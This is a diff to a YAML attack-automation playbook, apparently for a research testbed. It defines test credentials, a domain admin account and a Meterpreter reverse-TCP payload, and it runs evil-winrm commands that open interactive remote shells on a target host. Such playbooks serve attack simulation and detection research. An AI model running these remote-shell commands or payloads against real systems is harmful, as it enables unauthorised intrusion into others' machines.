@@ -4,7 +4,7 @@ vars:
   USER: Alice
   DOMAIN: aecid-testbed.com
   PASSWORD: Pa$$w0rd
-  PAYLOADS: /home/ubuntu/payloads
+  PAYLOADS: /home/aecid/payloads
   PAYLOAD: "windows/x64/meterpreter/reverse_tcp"
   DOMADM: "wsadmin"
   DOMADMPW: "Root.PW1"
@@ -15,8 +15,13 @@ commands:
   - type: shell
     creates_session: winrm
     command_timeout: 30
-    cmd: "/usr/local/bin/evil-winrm -i $TARGET -u $USER@$DOMAIN --no-colors -p '$PASSWORD' -P 5986 -S\n"
+    cmd: "evil-winrm -i $TARGET -u $USER@$DOMAIN --no-colors -p '$PASSWORD' -P 5986 -S\n"
     interactive: True
+
+  - type: shell
+    session: winrm
+    cmd: "mkdir C:\\Temp\n"
+    interactive: true
 
   - type: shell
     session: winrm
@@ -83,7 +88,7 @@ commands:
   - type: shell
     creates_session: winrmPriv
     command_timeout: 30
-    cmd: "/usr/local/bin/evil-winrm -i $TARGET -u $USER@$DOMAIN --no-colors -p '$PASSWORD' -P 5986 -S\n"
+    cmd: "evil-winrm -i $TARGET -u $USER@$DOMAIN --no-colors -p '$PASSWORD' -P 5986 -S\n"
     interactive: True
 
   - type: shell
